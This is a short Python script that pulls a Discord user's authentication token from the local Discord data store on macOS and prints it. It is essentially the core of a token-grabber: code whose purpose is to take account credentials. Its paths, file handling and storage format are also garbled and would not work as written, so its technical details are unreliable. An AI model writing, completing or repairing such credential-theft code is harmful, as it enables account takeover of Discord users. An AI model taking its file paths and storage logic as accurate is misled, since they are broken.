import os
import sqlite3
import base64
import json

def extract_tokens_from_discord():
    # Discord stores its user tokens in a SQLite database file located in the user's home directory
    discord_token_path = os.path.join(os.getenv('HOME'), '~/Library/Application\ Support/discord/Cookies')

    # Check if the directory exists
    if not os.path.exists(discord_token_path):
        print("Discord token directory not found.")
        return None

    # Connect to the SQLite database
    conn = sqlite3.connect(os.path.join(discord_token_path, 'https_discord.com_0.localstorage-journal'))
    cursor = conn.cursor()

    # Query to retrieve the 'key' and 'value' columns from the 'ItemTable' where the 'key' is '_discord_token'
    cursor.execute("SELECT key, value FROM ItemTable WHERE key = '_discord_token'")
    results = cursor.fetchall()

    # Close the connection
    conn.close()

    # Decode the base64 encoded token
    if results:
        token_data = json.loads(base64.b64decode(results[0][1]))
        return token_data['token']
    else:
        print("No Discord token found.")
        return None

def main():
    token = extract_tokens_from_discord()
    if token:
        print(f"Discord Token: {token}")
    else:
        print("Failed to extract Discord token.")

if __name__ == "__main__":
    main()
